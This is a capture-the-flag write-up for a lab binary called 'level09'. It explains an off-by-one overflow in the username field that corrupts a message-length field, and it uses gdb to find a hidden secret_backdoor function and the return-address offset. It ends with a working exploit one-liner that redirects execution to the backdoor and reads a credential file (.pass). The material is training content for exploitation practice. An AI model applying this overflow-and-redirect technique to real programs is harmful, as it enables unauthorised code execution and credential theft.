# Level09

## Observations

```c
for (i = 0; (i < 41 && (input[i] != '\0')); i = i + 1)
```

We noticed that there's a loop which can write 41 in the username, which has a size of 40.
So we can write a byte in `msg_data.msg_len` that's follows username in memory.

This allows us to write out of the struct in `set_msg`.

There's also a function called `secret_backdoor` in the binary but never called.

With a buffer overflow we can redirect the program to run `secret_backdoor` after `handle_msg` instead of `main`.

## Gather information

### `secret_backdoor`'s address

We can use `gdb` to get the address of the function

```shell 
$ gdb ./level09
(gdb) b main
(gdb) r

Breakpoint 1, 0x0000555555554aac in main ()
(gdb) p secret_backdoor 
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

### Get the buffer overflow offset

We can use `gdb` and a buffer overflow mask to get the offset for buffer overflow.

```shell
$ (python -c 'print "a"*40 + chr(255)'; python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"';) > /tmp/payload09
$ gdb ./level09
(gdb) r < /tmp/payload09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
(gdb) info frame
...
rip = 0x555555554931 in handle_msg; saved rip 0x4138674137674136
...
```

So we have on offset of `200`.

## Exploit

Now we can exploit the binary by writing the address of `secret_backdoor` and adjust the value in `msg_data.msg_len`.

```shell
$ (python -c 'print "a"*40 + chr(206)'; python -c 'print "b" * 200 + "\x8c\x48\x55\x55\x55\x55"'; echo "cat /home/users/end/.pass") | ./level09
```
